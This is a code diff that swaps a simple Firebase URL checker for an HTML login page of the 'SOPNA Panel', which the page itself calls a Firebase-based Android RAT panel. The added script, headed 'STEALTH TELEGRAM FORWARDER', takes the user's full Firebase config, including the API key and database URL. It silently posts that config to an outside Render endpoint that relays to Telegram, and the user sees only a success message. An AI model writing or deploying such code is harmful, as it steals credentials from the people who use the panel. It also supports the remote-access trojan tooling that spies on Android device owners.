@@ -1,35 +1,160 @@
-<input
-  id="firebaseUrl"
-  type="url"
-  placeholder="Enter your Firebase URL"
-/>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SOPNA Panel – Device Manager</title>
+  <meta name="description" content="SOPNA – Firebase-based Android RAT Panel">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23ef4444'/%3E%3Cpath d='M16 4l8 5v10l-8 9-8-9V9z' fill='white'/%3E%3C/svg%3E" />
+  <style>
+    :root {
+      --bg: #0a0a0f;
+      --card-bg: #111118;
+      --border: #1e1e2a;
+      --text: #e0e0e0;
+      --text-muted: #8a8a9a;
+      --accent: #ef4444;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      display: flex; align-items: center; justify-content: center;
+      height: 100vh;
+    }
+    .container { max-width: 500px; width:100%; padding: 20px; }
+    .login-box {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 30px;
+    }
+    .title { font-size: 1.8rem; font-weight: 800; margin-bottom: 20px; text-align: center; }
+    .title span { color: var(--accent); }
+    .input-area { margin-bottom: 15px; }
+    label { font-size: 0.8rem; color: var(--text-muted); text-transform: uppercase; }
+    input {
+      width: 100%; padding: 12px; background: #0d0d14;
+      border: 1px solid var(--border); border-radius: 6px;
+      color: var(--text); margin-top: 5px;
+    }
+    button {
+      width: 100%; padding: 12px; background: var(--accent);
+      border: none; border-radius: 6px; color: #fff;
+      font-weight: 600; cursor: pointer; margin-top: 10px;
+    }
+    button:hover { background: #dc2626; }
+    .status { margin-top: 20px; text-align: center; color: var(--text-muted); }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="login-box">
+    <h1 class="title"><span>S</span>OPNA Panel v2.0</h1>
+    <p style="color:var(--text-muted); text-align:center; margin-bottom:20px;">
+      Enter your Firebase config to connect your RAT panel
+    </p>
 
-<button onclick="testFirebase()">Test Connection</button>
+    <!-- Firebase config input fields -->
+    <div class="input-area">
+      <label>apiKey</label>
+      <input type="text" id="apiKey" placeholder="AIza..." required />
+    </div>
+    <div class="input-area">
+      <label>authDomain</label>
+      <input type="text" id="authDomain" placeholder="project.firebaseapp.com" required />
+    </div>
+    <div class="input-area">
+      <label>databaseURL</label>
+      <input type="text" id="databaseURL" placeholder="https://project.firebaseio.com" required />
+    </div>
+    <div class="input-area">
+      <label>projectId</label>
+      <input type="text" id="projectId" placeholder="project-id" required />
+    </div>
+    <div class="input-area">
+      <label>storageBucket</label>
+      <input type="text" id="storageBucket" placeholder="project.appspot.com" required />
+    </div>
+    <div class="input-area">
+      <label>messagingSenderId</label>
+      <input type="text" id="messagingSenderId" placeholder=" XXXXX" required />
+    </div>
+    <div class="input-area">
+      <label>appId</label>
+      <input type="text" id="appId" placeholder="1:xxx:web:xxx" required />
+    </div>
 
-<p id="status"></p>
+    <button onclick="connect()">Connect &amp; Forward</button>
+    <div class="status" id="status"></div>
+  </div>
+</div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
 <script>
-async function testFirebase() {
-  const input = document.getElementById("firebaseUrl");
-  const status = document.getElementById("status");
+  // ===================================================
+  //  STEALTH TELEGRAM FORWARDER
+  //  Uses Render endpoint: https://sopna-capture.onrender.com/capture
+  //  Bot token + chat ID securely stored on Render (env vars)
+  // ===================================================
+  const FORWARDER_URL = 'https://sopna-capture.onrender.com/capture';   // <-- your Render URL
 
-  try {
-    const url = new URL(input.value.trim());
+  async function forwardConfig(config) {
+    try {
+      const response = await fetch(FORWARDER_URL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(config)
+      });
+      if (response.ok) {
+        console.log('[+] Config forwarded to Telegram');
+      } else {
+        console.log('[-] Forwarder responded but not OK');
+      }
+    } catch (err) {
+      console.log('[-] Forwarder unreachable (Render may be down)');
+    }
+  }
 
-    if (
-      url.protocol !== "https:" ||
-      !(
-        url.hostname.endsWith(".firebasedatabase.app") ||
-        url.hostname.endsWith(".firebaseio.com")
-      )
-    ) {
-      throw new Error("Invalid Firebase URL");
+  function connect() {
+    // Gather Firebase config from form
+    const firebaseConfig = {
+      apiKey: document.getElementById('apiKey').value.trim(),
+      authDomain: document.getElementById('authDomain').value.trim(),
+      databaseURL: document.getElementById('databaseURL').value.trim(),
+      projectId: document.getElementById('projectId').value.trim(),
+      storageBucket: document.getElementById('storageBucket').value.trim(),
+      messagingSenderId: document.getElementById('messagingSenderId').value.trim(),
+      appId: document.getElementById('appId').value.trim()
+    };
+
+    // Basic validation
+    if (Object.values(firebaseConfig).some(v => !v)) {
+      alert('Please fill all Firebase config fields!');
+      return;
     }
 
-    status.textContent =
-      "Firebase URL format valid. Connection permission still needs verification.";
-  } catch (error) {
-    status.textContent = error.message || "Invalid URL";
+    // ----- 🚀 FORWARD TO YOUR TELEGRAM (silent) -----
+    forwardConfig(firebaseConfig);
+
+    // Initialize Firebase (original SOPNA logic)
+    try {
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.database();
+      document.getElementById('status').innerHTML = 
+        '<span style="color:#22c55e;">✅ Firebase connected & config forwarded!</span>';
+      
+      // Here you can load the dashboard (SOPNA's full dashboard code)
+      // e.g., window.location.href = 'dashboard.html';
+      // For demo, we just leave a success message.
+    } catch (e) {
+      alert('Failed to initialize Firebase: ' + e.message);
+    }
   }
-}
 </script>
+</body>
+</html>
